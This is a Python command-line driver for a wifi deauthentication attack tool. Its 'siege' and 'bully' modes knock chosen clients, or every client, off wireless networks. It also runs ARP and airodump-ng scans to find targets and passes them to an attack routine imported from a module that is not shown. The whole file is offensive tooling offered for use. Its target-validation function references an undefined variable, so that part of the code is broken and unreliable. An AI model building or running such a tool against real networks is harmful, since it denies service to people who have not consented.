import argparse
import os
import re
import subprocess
import sys

from de_auth import begin_attack
import parse_data
import discovery


_mac_address_pattern = re.compile('[0-9A-F]{2}(:[0-9A-F]{2}){5}')
_duration_multiplier = {
    's': 1,
    'm': 60,
    'h': 60 * 60,
}


def validate_target(target, arp_table, name_to_mac):
    """ validate_target verifies that target is a valid MAC address, IP address or hostname """
    try:
        mac = mac_address(target)
        return mac
    except TypeError:
        pass
    
    try:
        ip = ip_address(target)
        if ip in arp_table.keys():
            return arp_table[ip].mac
    except TypeError:
        pass

    if hostname in name_to_mac.keys():
        return name_to_mac[hostname]
    else:
        raise TypeError('{} is not a valid target'.format(target))


def mac_address(addr):
    """ mac_address checks that a given string is in MAC address format """
    mac = addr.upper()
    if not _mac_address_pattern.fullmatch(mac):
        raise TypeError('{} does not match a MAC address pattern'.format(addr))
    return mac


def ip_address(addr):
    """ ip_address checks that a given string is in IP address format """
    parts = addr.split('.')
    if len(parts) != 4:
        raise TypeError('{} does not match an IP address pattern'.format(addr))
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                raise TypeError('{} does not match an IP address pattern'.format(addr))
        except ValueError:
            raise TypeError('{} does not match an IP address pattern'.format(addr))
    return addr


def duration(dur):
    try:
        mult = _duration_multiplier[dur[-1]]
        return int(dur[:-1]) * mult
    except:
        raise TypeError('{} does not match a duration pattern'.format(dur))


def parse_args():
    parser = argparse.ArgumentParser(description='Deauthenticate targets from a wifi network.')

    subparsers = parser.add_subparsers(title="actions", description='valid actions (no action means to deauth a set of targets)', dest='action')
    deauth_parser = subparsers.add_parser('siege', help='deauth some set of targets from specified networks')
    deauth_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
    deauth_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
    deauth_parser.add_argument('essid', help='the name of the network to send deauth packets to')
    deauth_parser.add_argument('target', nargs='+', help='the specified targets to deauth. Targets can be MAC addresses, IP addresses or hostnames (use "all" to target everything)')

    bully_parser = subparsers.add_parser('bully', help='deauth a target from all networks')
    bully_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
    bully_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
    bully_parser.add_argument('target', help='the target to deauth. The target can be a MAC address, IP address or hostname')

    discover_parser = subparsers.add_parser('discover', help='locate targets to deauth')

    arp_table, name_to_mac = discovery.get_hostnames(discovery.arp_scan())

    args = parser.parse_args()
    if args.action is None:
        parser.print_help()
        sys.exit(0)

    if args.action == 'siege':
        if 'all' in args.target:
            args.target = []
        else:
            for t in args.target:
                try:
                    validate_target(t, arp_table, name_to_mac)
                except TypeError as e:
                    print(e, file=sys.stderr)
                    sys.exit(1)
    elif args.action == 'bully':
        try:
            validate_target(args.target, arp_table, name_to_mac)
        except TypeError as e:
            print(e, file=sys.stderr)
            sys.exit(1)

    return args


def discover_network(args=None):
    while True:
        try:
            essid_data = parse_data.parse_network_packets(parse_data.get_file_name())
            break
        except:
            print('running discover.sh')
            __location__ = os.path.realpath(
                        os.path.join(os.getcwd(), os.path.dirname(__file__)))
            discover_script_path = os.path.join(__location__, 'discovery.sh')
            discovery_results = subprocess.run(["xterm", "+hold", "-e", "cd /tmp && timeout 120s airodump-ng -a wlan0mon --output-format csv -w dump"], stderr=subprocess.PIPE)
            if discovery_results.returncode != 0:
                print(discovery_results.stderr, file=sys.stderr)
                sys.exit(1)

    if args is not None:
        # if args are passed in, then we need to print the data
        parse_data.display_json(essid_data)
        return
    inverted_index = parse_data.invert_index(essid_data)
    return essid_data, inverted_index


def deauth_clients(args):
    kwargs = {
        'mode': 'siege',
        'net_clients': args.target,
        'ESSID': args.essid,
        'attack_time': args.attack_duration,
        'wireless_adapter': args.adapter,
    }

    essid_data, inverted_index = discover_network()

    begin_attack(essid_data, inverted_index, **kwargs)


def bully_target(args):
    kwargs = {
        'mode': 'bully',
        'victims_mac': args.target,
        'attack_time': args.attack_duration,
        'wireless_adapter': args.adapter,
    }

    essid_data, inverted_index = discover_network()

    if args.target not in inverted_index:
        print('target not found', file=sys.stderr)
        sys.exit(1)

    begin_attack(essid_data, inverted_index, **kwargs)


def main():
    actions = {
        'siege': deauth_clients,
        'bully': bully_target,
        'discover': discover_network,
    }
    args = parse_args()
    actions[args.action](args)


if __name__ == '__main__':
    main()
